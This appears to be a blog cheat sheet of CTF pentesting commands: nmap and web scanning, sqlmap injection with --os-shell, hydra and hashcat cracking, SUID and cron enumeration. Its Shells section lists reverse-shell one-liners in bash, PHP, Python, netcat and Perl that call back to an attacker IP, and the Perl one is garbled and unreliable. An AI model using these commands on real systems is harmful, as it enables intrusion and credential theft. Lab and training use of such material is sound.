---
layout: post
title: "Useful Commands"
---


-----

## A list of the most used commands & tools across the CTF cycle


----

### Table of Contents


* **[Scanning](#scanning)**
    * [Nmap](#nmap)
    * [NetDiscover](#netdiscover)
    * [PingSweep](#pingsweep)
    * [Gobuster](#gobuster)
    * [Wfuzz](#wfuzz)
    * [WpScan](#wpscan)
    * [Zoom](#zoom)
    * [Nikto](#nikto)


* **[Gaining Access](#gaining-access)**
    * [Metasploit](#metasploit)
    * [Sqlmap](#sqlmap)
  


* **[Enumeration/PrivEsc](#enumeration/privesc)**
    * [Enum4Linux](#enum4linux)
    * [PowerUp](#powerup)

* **[Cracking](#cracking)**
    * [Hydra](#hydra)
    * [Hashcat](#hashcat)
    * [John](#john)
    * [Stegcracker](#stegcracker)

* **[Extra](#extra)**
    * [Shells](#shells)
    * [SMB](#smb)
    * [NFS](#nfs)
    * [FTP](#ftp)
    * [SCP](#scp)



**Note**:  At the beggining of each CTF challenge, it's easier to create variables such as **IP** & **URL**, as oposed to always copy-pasting the IP adrress.

```powershell
#The syntax is the following:
export IP=10.0.0.1
export URL="http://10.0.0.1"
```
# ![img1](/assets/images/commandlist/img1.png)

------------------------------

## Scanning 

-----------
#### Nmap


```bash
nmap -sC -sV -p- $IP --open
nmap --script=vuln $IP

# -sV -> Version detection
# -sC -> Execute default scripts
# -A  -> OS detection and traceroute + the 2 above(sC,sV)
# -p- -> Scan all 65535 ports (the scan might take a great amount of time)

```


#### Netdiscover


```bash
netdiscover -r $IP/24

# -r IP/MASK: Network range(CIDR) to be scanned
# -l file: scan the list of ranges contained into the given file
# -i device: your network device

```

#### PingSweep

```vim

#!/bin/bash
#script will scan subnet 10.1.1.0/24 - adjust apropriately.

for ip in $(seq 1 254);do
    ping -c 1 10.1.1.$ip | grep "bytes from" | cut -d" " -f4 | cut -d":" -f1 &
done
```


#### Gobuster

```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# -w -> specify wordlist to use
# dir -> directory/file enumeration mode
# -t -> number of concurrent threads
# -x -> file extensions to look for (for ex: txt,php,html,xml)
```

#### Wfuzz

```bash
#FUZZ Directories:
wfuzz -c -z file,/usr/share/wordlists/Seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

#FUZZ FILES:
wfuzz -c -z file,/usr/share/wordlists/Seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|

```

#### WPScan

```bash

#WPScan Brute Force:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

#Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive

```

#### Zoom

```bash
#Zoom is a lightning-fast WordPress vulnerability scanner
git clone https://github.com/gcxtx/zoom

#Manual Mode - In manual mode you must specify a WordPress website to scan for vulnerabilities
python zoom.py -u <wordpress website>

#Automatic Mode - In automatic mode, Zoom will find subdomains and check those using WordPress for vulnerabilities.
python zoom.py -u <website> --auto
```

#### Nikto

```bash
nikto -host $URL
```
------------------

## Gaining access
-----

#### SQLMap

```sh
# sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

#To get a list of basic options and switches use:
sqlmap -h (-hh for all options/extended)

#Simple HTTP GET Based Test
sqlmap -u https://testsite.com/page.php?id=1 --dbs

# -u state the vulnerable URL
# --dbs to enumerate the database.


#Simple HTTP POST Based Test - In burpsuite identify the vulnerable POST request and save it. You can right click on the request and select "Copy to file" and save the request to a local file. Next you can point SQLMap to that file using the -r parameter:

1. sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
or
2. sqlmap -r <request_file> --dump --batch

#Syntax for connecting to MySQL
mysql -h [IP] -u [username] -p


###AUTHENTICATED

sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" --dbs

The above query causes sqlmap to apply various injection techniques on the name parameter of the URL in an attempt to extract the database information of the website.

# -u specifies the target URL
# --cookie specifies the HTTP cookie header value
# --dbs enumerates DBMS databases.

Assuming the previous comand retrieved multiple DBs and we want to use sqlmap to retrieve the tables in one database, we can use the below command:

sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" -D databse_name --tables

# -D specifies the DBMS database to enumerate 
# --tables enumerates DBMS database tables.

Once the tables found and we want to retrieve/dump the content of a specific table, use command:

sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" -D databse_name -T table_name --dump


#To spawn an interractive shell:
sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" --os-shell
```





--------------

## Enumeration/PrivEsc

------------


#### Enum4Linux

```sh

Usage: enum4linux [options] $IP

Options can be:
    -U        get userlist
    -M        get machine list*
    -S        get sharelist
    -P        get password policy information
    -G        get group and member list
    -d        be detailed, applies to -U and -S
```



#### PowerUp


--------------
## Cracking
----

#### Hydra

```bash
  hydra -l user -P passlist.txt ftp://$IP
  hydra -L userlist.txt -p defaultpw imap://$IP/PLAIN
  hydra -l admin -p password ftp://$IP
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

#### Hashcat
```sh
  Attack-Mode   Hash-Type   Command
 ==============+==========+================================================================== 

  Wordlist      | $P$   | hashcat -a 0 -m 400 example400.hash wordlist.txt 

  Brute-Force   | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a 

  Combinator    | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict 

 

```

#### John
```sh
#Automatic cracking
john --wordlist=[path to wordlist] [path to hash_file] 
```


#### Stegcracker

```markdown
#usage: 
stegcracker <file> [<wordlist>]

This is a steganography brute-force utility to uncover hidden data inside files. Accepted file types are: jpg, jpeg, bmp, wav, au

StegCracker has been retired following the release of StegSeek, which will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours. StegSeek can be found at: https://github.com/RickdeJager/stegseek

#usage:
stegseek  <file> [<wordlist>]
```

--------

## Extra

----------

#### Shells

```sh
#Reverse shells
Bash	bash -i >& /dev/tcp/10.0.0.1/9999 0>&1
PHP	php -r '$sock=fsockopen("10.0.0.1",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
Python	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
NC v1	nc -e /bin/sh 10.0.0.1 9999
NC v2	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.67 9999 >/tmp/f
Perl	perl -e 'use Socket;i="10.0.0.1";i="10.0.0.1";p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(p,inet\_aton(p,inet_aton(i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#Shell Upgrades
Perl	perl -e 'exec "/bin/bash";'
Bash	echo os.system('/bin/bash')

#Python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116

```



#### SMB

```sh

#Access the SMB share: 
smbclient //$IP/SHARE_NAME 

#use:
-U [name] : to specify the user 
-p [port] : to specify the port 
```
#### NFS
```sh
#List the NFS shares 
showmount -e $IP

#Mounting NFS shares
sudo mount -t nfs $IP:share /tmp/mount/ -nolock

#mount -> Execute the mount command 
#-t nfs -> Type of device to mount, then specifying that it's NFS 
#$IP:share -> The IP Address of the NFS server, and the name of the share we wish to mount 
#-nolock -> Specifies not to use NLM locking 

```

#### FTP

```sh
ftp $IP
```

#### SCP

```sh
#Copy a file from our machine to a remote machine
scp local_file.txt user@10.0.0.1:/home/user/transferred_file.txt

#Copy a file from a remote computer that we're not logged into
scp user@10.0.0.1:/home/user/remote_file.txt local_filename.txt
```



#### SUID Commands
```sh
find / -user root -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ; > /tmp/suid
getcap -r / 2>/dev/null
```

#### System version

```sh
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

#### Service settings

```sh
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```
#### Cron jobs

```sh
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### Port forward

```sh
ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@10.0.0.1 #Local Port
ssh -R 8080:127.0.0.1:80 root@10.0.0.1 #Remote Port
```




### References
* Nmap. https://nmap.org/
* DirBuster. https://sourceforge.net/projects/dirbuster/
* Nikto. https://cirt.net/Nikto2
* Metasploit Framework. https://www.metasploit.com/
* Hydra. https://github.com/vanhauser*thc/thc*hydra
* John the Ripper. https://www.openwall.com/john/
* LinEnum. https://github.com/rebootuser/LinEnum
* Linux Exploit Suggester. https://github.com/mzet*/linux*exploit*suggester
* Windows Exploit Suggester. https://github.com/GDSSecurity/Windows*Exploit*Suggester
